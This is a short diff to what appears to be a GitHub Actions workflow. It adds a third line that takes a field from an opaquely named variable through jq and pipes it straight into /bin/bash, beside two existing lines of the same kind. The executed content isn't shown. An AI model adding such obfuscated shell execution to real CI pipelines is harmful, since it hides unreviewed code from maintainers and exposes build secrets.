@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$szm0" | jq -r .un078 | /bin/bash
           echo $ymhlt11 | jq -r .vn55219 | /bin/bash
+          echo $hchv60 | jq -r .f83002 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
